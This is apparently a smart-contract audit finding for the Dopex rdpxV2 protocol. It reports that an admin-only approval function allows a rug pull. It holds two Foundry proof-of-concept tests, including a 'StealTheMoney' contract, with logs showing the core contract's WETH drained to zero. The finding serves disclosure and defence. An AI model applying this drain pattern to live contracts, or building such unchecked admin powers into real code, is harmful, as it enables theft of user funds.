## Vulnerability details
### Impact
The protocol is vulnerable to easy rug-pulling by the `DEFAULT_ADMIN_ROLE`.
The functions `approveContractToSpend()` looks like this:
- https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L396-L412

```solidity
/**
   * @notice Approve a contract to spend a certain amount of tokens
   * @dev    Can only be called by admin
   * @param  _token the address of the token to approve
   * @param  _spender the address of the contract to approve
   * @param  _amount the amount to approve
   */
  function approveContractToSpend(
    address _token,
    address _spender,
    uint256 _amount
  ) external onlyRole(DEFAULT_ADMIN_ROLE) {
    _validate(_token != address(0), 17);
    _validate(_spender != address(0), 17);
    _validate(_amount > 0, 17);
    IERC20WithBurn(_token).approve(_spender, _amount);
  }
```
Reflecting on the function, it becomes evident that the administrator holds the power to `approve` any contract or external owned account `EOA`, granting them the ability to spend a `certain amount of tokens` at any time. This situation could be detrimental to investors who intend to participate in the `Dopex protocol`. While reviewing the protocol's documentation, explicit information about the entities responsible for overseeing these roles, whether it's a `Multisig` or `EOA` , was not found `but the sponsors let us know the following`:
```shell
they will be controlled by the protocol through a multisig

```
Even if the documentation provided clarity on role ownership, the inherent risk associated with the function remains concerning for user funds as it significantly deviates from the core principles of `DeFi` and `Web3` security should not be based on "trust".

### Proof of Concept
To assess the existing risk, we conducted two PoCs â€“ one to demonstrate the ability to approve any External Owned Account (EOA), and another to showcase the feasibility of approving any contract.

- `PoC 1`: This PoC is to approve any external owned account that the admin wants can be approved.

1. `Copy and paste` the following test into the `tests/rdpxV2-core/Unit.t.sol`
   
```solidity
     function testEOACanBeApproved() public {
        // Lets make the rdpxV2Core contract has balance
        weth.transfer(address(rdpxV2Core), 25 * 1e18);

        address alice = makeAddr("alice");
        
        console.log("Balance of rdpxV2Core before being approved to an EOA:", weth.balanceOf(address(rdpxV2Core)));
        rdpxV2Core.approveContractToSpend(address(weth), alice, 25 * 1e18);

        // now the address that the admin approved can steal the tokens approved by admin
        console.log("EOA make the tx");
        vm.startPrank(alice);
        weth.transferFrom(address(rdpxV2Core), alice, 25 * 1e18);
        console.log("rdpxV2Core balance after rugpull from the alice address :", weth.balanceOf(address(rdpxV2Core)));
        vm.stopPrank();
    }
```   
2. run test with the following command `forge test --match-test testEOACanBeApproved -vv`

The output is:

```terminal
Running 1 test for tests/rdpxV2-core/Unit.t.sol:Unit
[PASS] testEOACanBeApproved() (gas: 85071)
Logs:
  Balance of rdpxV2Core before being approved to an EOA: 25000000000000000000
  EOA make the tx
  rdpxV2Core balance after rugpull from the alice address : 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 682.50ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

- `PoC 2`: This Proof of Concept (PoC) aims to approve any contract that the administrator desires. In this case, we created a malicious contract to demonstrate how unsafe it can be for the users..

1. `Copy and paste` the following test into the `tests/rdpxV2-core/Unit.t.sol`

```solidity
    function testAdminCanCauseRugpull() public {
        // Lets make the rdpxV2Core contract has balance
        weth.transfer(address(rdpxV2Core), 25 * 1e18);
 
        StealTheMoney stealTheMoneyContract = new StealTheMoney(address(weth));
        console.log("rdpxV2Core balance before rugpull from the contract:", weth.balanceOf(address(rdpxV2Core)));
        // Try to approve whatever contract the admin want to approve
        rdpxV2Core.approveContractToSpend(address(weth), address(stealTheMoneyContract), 25 * 1e18);

        // now the contract address that the admin approved can steal the tokens approved by admin
        console.log("Contract make the tx");
        vm.prank(address(stealTheMoneyContract));
        stealTheMoneyContract.sendAllTheMoney(address(rdpxV2Core), address(11), 25 * 1e18);
        // weth.transferFrom(address(rdpxV2Core), address(11), 25 * 1e18);
        console.log("rdpxV2Core balance after rugpull from the contract:", weth.balanceOf(address(rdpxV2Core)));
    }
```
2. then out of the test `copy and paste` this contract:
```solidity
interface IWeth {
    function transferFrom(address src, address dst, uint wad) external;
}

contract StealTheMoney  {
    IWeth weth;

    constructor(address _weth) {
        weth = IWeth(_weth);
    }

    function sendAllTheMoney(address _from, address _to, uint256 _amount) external {
        weth.transferFrom(_from, _to , _amount);
    }
}
```

3. run the test with this command `forge test --match-test testAdminCanCauseRugpull -vv`

The output is:

```terminal
Running 1 test for tests/rdpxV2-core/Unit.t.sol:Unit
[PASS] testAdminCanCauseRugpull() (gas: 190425)
Logs:
  rdpxV2Core balance before rugpull from the contract: 25000000000000000000
  Contract make the tx
  rdpxV2Core balance after rugpull from the contract: 0

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 588.43ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
### Tools Used
Foundry and Manual review.

### Recommended Mitigation Steps
This is due to an insecure design of the protocol. So as far as recommendations go, the team should reconsider the function's design.
